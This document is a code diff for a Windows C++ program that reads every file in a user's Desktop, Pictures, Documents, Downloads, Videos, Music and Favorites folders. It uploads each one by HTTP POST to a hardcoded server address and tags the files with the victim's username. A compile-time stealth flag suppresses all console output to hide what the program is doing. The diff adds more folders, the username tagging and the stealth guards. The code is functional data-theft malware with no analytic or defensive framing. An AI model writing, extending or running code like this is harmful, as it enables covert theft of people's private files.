@@ -10,7 +10,8 @@
 #include <iostream>
 #include <filesystem>
 #include <fstream>
-
+#include <Lmcons.h>
+#include <sstream>
 
 namespace fs = std::filesystem;
 
@@ -18,68 +19,73 @@ namespace fs = std::filesystem;
 #define stealthBehaviour false
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
-const char szHost[] = "192.168.1.139";
+const char szHost[] = "192.168.1.139"; // The IP address of the server
 
-// Function to generate a user-friendly error message based on the error code
-const char* FormatErrorMessage(DWORD errorCode){
-	// Use the FormatMessage function to generate the error message
-	char errorMessage[1024];
-	FormatMessage(
-		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL,
-		errorCode,
-		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		errorMessage,
-		sizeof(errorMessage),
-		NULL
-	);
-	// Return the error message
-	return errorMessage;
-}
-
-void sendFile(std::string path, std::string fileName) {
+/* 
+	returns a connected socket at the given address and port
+*/
+SOCKET connectToServer(const char* szHostAddress, int nPort){
 	// Initialize Winsock
 	WSADATA wsaData;
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+#if !stealthBehaviour
 	if (iResult != 0) {
 		printf("WSAStartup failed with error: %d\n", iResult);
-		return;
 	}
+#endif
 	// Create a socket
 	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+#if !stealthBehaviour
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf("socket failed with error: %ld\n", WSAGetLastError());
+		printf("Socket failed with error: %ld\n", WSAGetLastError());
 		WSACleanup();
-		return;
 	}
+#endif
 	// Resolve the server address and port
 	struct sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
-	clientService.sin_addr.s_addr = inet_addr(szHost);
-	clientService.sin_port = htons(SERV_PORT);
-	// Connect to server.
+	clientService.sin_addr.s_addr = inet_addr(szHostAddress);
+	clientService.sin_port = htons(nPort);
+	// Connect to server:
 	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
+#if !stealthBehaviour
 	if (iResult == SOCKET_ERROR) {
-		printf("connect failed with error: %d\n", WSAGetLastError());
+		printf("Connect failed with error: %d\n", WSAGetLastError());
 		closesocket(ConnectSocket);
 		WSACleanup();
-		return;
 	}
-	// Load the file from the disk
-	std::ifstream in(path, std::ios::binary);
-	if (!in) {
-		printf("Failed to open file %s for reading\n", path.c_str());
-		return;
+	printf("Connected to %s on port %d\n", szHostAddress, nPort);
+#endif
+	return ConnectSocket;
+}
+
+void sendFile(std::string path, std::string fileName){
+	SOCKET s = connectToServer(szHost, SERV_PORT);
+	std::fstream in(path, std::ios::in | std::ios::binary);
+#if !stealthBehaviour
+	if (!in.is_open()) {
+		printf("Error opening file %s\n", path.c_str());
 	}
-	// Get the file size
+#endif
+	// Get the filesize of the file
 	in.seekg(0, std::ios::end);
 	int fileSize = in.tellg();
 	in.seekg(0, std::ios::beg);
-	// Allocate memory for the file
-	char* fileBuffer = new char[fileSize];
-	// Read the file into memory
-	in.read(fileBuffer, fileSize);
-	in.close();
+	
+	// Create a vector for the data
+	std::vector<char> data;
+	if (!in.eof() && !in.fail()){
+		in.seekg(0, std::ios_base::end);
+		std::streampos fileSize = in.tellg();
+		data.resize(fileSize);
+		in.seekg(0, std::ios_base::beg);
+		in.read(&data[0], fileSize);
+	}
+
+#if !stealthBehaviour
+	printf("Data size: %d\n", data.size());
+#endif
+
 	// Assemble a HTTP POST request
 	// FORMAT:
 	/*
@@ -98,37 +104,60 @@ void sendFile(std::string path, std::string fileName) {
 	request += "Content-Type: multipart/form-data; boundary=MY_BOUNDARY\r\n\r\n";
 	request += "--MY_BOUNDARY\r\n";
 	request += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n";
-	request += std::string(fileBuffer, fileSize);
+	std::vector<char> requestBinary;
+	for (char c : request) {
+		requestBinary.push_back(c);
+	}
+	// Add the file data
+	for (char c : data) {
+		requestBinary.push_back(c);
+	}
+	// Add the end boundary
+	request = "";
 	request += "\r\n--MY_BOUNDARY--\r\n";
-	std::cout << request << std::endl;
+	for (char c : request) {
+		requestBinary.push_back(c);
+	}
 	// Send the HTTP POST request
-	iResult = send(ConnectSocket, request.c_str(), request.length(), 0);
-	if (iResult == SOCKET_ERROR) {
+	int result = send(s, requestBinary.data(), requestBinary.size(), 0);
+#if !stealthBehaviour
+	if (result == SOCKET_ERROR) {
 		printf("send failed with error: %d\n", WSAGetLastError());
-		closesocket(ConnectSocket);
-		WSACleanup();
 		return;
 	}
-	// Receive the HTTP response
-	/*
-	char recvbuf[1024];
-	iResult = recv(ConnectSocket, recvbuf, 1024, 0);
-	if (iResult > 0) {
-		printf("Response: %s\n", recvbuf);
-	}
-	else if (iResult == 0) {
-		printf("Connection closed\n");
-	}
-	else {
-		printf("recv failed with error: %d\n", WSAGetLastError());
-	}
-	*/
-	// Cleanup
-	closesocket(ConnectSocket);
+	std::cout << "Sent file " << fileName << std::endl;
+#endif
+	// Wait for a response
+	char responseBuffer[1024];
+	recv(s, responseBuffer, 128, 0);
+#if !stealthBehaviour
+	printf("Response: %s\n", responseBuffer);
+#endif
+	// Clean up the memory and socket
+	closesocket(s);
 	WSACleanup();
+	in.close();
 }
 
 
+
+void uploadFilesInFolder(fs::path p) {
+	for (const auto& entry : fs::directory_iterator(p)) {
+		// Check if entry is a file or a folder
+		if (!entry.is_directory()) {
+			// Get the username of the machine
+			std::string username;
+			char szUsername[UNLEN + 1];
+			DWORD usernameLen = UNLEN + 1;
+			GetUserName(szUsername, &usernameLen);
+			username = szUsername;
+#if !stealthBehaviour
+			printf("Sending file %s\n", entry.path().filename().string().c_str());
+#endif
+			sendFile(entry.path().string(), username + "_" + entry.path().filename().string());
+		}
+	}
+}
 
 int main() {
 #if stealthBehaviour
@@ -171,12 +200,19 @@ int main() {
 	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
 	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
 	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
-	// Iterate through files
-	for (const auto& entry : fs::directory_iterator(documentsPath)) {
-		std::cout << entry.path() << std::endl;
-		sendFile(entry.path().string(), entry.path().filename().string());
-	}
-
+	fs::path videosPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Videos");
+	fs::path musicPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Music");
+	fs::path favouritesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Favorites");
+	// Start uploading stuff
+	uploadFilesInFolder(desktopPath);
+	uploadFilesInFolder(picturesPath);
+	uploadFilesInFolder(documentsPath);
+	uploadFilesInFolder(downloadsPath);
+	uploadFilesInFolder(videosPath);
+	uploadFilesInFolder(musicPath);
+	uploadFilesInFolder(favouritesPath);
+	// Done!
+	// Get a char to keep the window alive
 	getchar();
 	ExitProcess(EXIT_SUCCESS);
 }
